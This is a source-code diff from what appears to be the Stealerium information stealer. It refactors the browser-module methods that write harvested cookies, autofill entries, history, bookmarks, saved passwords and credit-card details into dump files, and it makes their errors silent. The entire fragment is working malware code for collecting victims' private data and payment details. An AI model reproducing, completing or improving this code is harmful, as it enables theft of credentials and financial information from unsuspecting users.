@@ -40,67 +40,59 @@ namespace Stealerium.Target.Browsers
             return $"### {bBookmark.Title} ###\n";
         }
 
-        public static bool WriteCookies(List<Cookie> cCookies, string sFile)
+        public static void WriteCookies(List<Cookie> cCookies, string sFile)
         {
             try
             {
                 foreach (var cCookie in cCookies)
                     File.AppendAllText(sFile, FormatCookie(cCookie));
-
-                return true;
             }
             catch
             {
-                return false;
+                // ignored
             }
         }
 
-        public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
+        public static void WriteAutoFill(List<AutoFill> aFills, string sFile)
         {
             try
             {
                 foreach (var aFill in aFills)
                     File.AppendAllText(sFile, FormatAutoFill(aFill));
-
-                return true;
             }
             catch
             {
-                return false;
+                // ignored
             }
         }
 
-        public static bool WriteHistory(List<Site> sHistory, string sFile)
+        public static void WriteHistory(List<Site> sHistory, string sFile)
         {
             try
             {
                 foreach (var sSite in sHistory)
                     File.AppendAllText(sFile, FormatHistory(sSite));
-
-                return true;
             }
             catch
             {
-                return false;
+                // ignored
             }
         }
 
-        public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
+        public static void WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
         {
             try
             {
                 foreach (var bBookmark in bBookmarks)
                     File.AppendAllText(sFile, FormatBookmark(bBookmark));
-
-                return true;
             }
             catch
             {
-                return false;
+                // ignored
             }
         }
 
-        public static bool WritePasswords(List<Password> pPasswords, string sFile)
+        public static void WritePasswords(List<Password> pPasswords, string sFile)
         {
             try
             {
@@ -110,27 +102,23 @@ namespace Stealerium.Target.Browsers
                         continue;
                     File.AppendAllText(sFile, FormatPassword(pPassword));
                 }
-
-                return true;
             }
             catch
             {
-                return false;
+                // ignored
             }
         }
 
-        public static bool WriteCreditCards(List<CreditCard> cCc, string sFile)
+        public static void WriteCreditCards(List<CreditCard> cCc, string sFile)
         {
             try
             {
                 foreach (var aCc in cCc)
                     File.AppendAllText(sFile, FormatCreditCard(aCc));
-
-                return true;
             }
             catch
             {
-                return false;
+                // ignored
             }
         }
     }
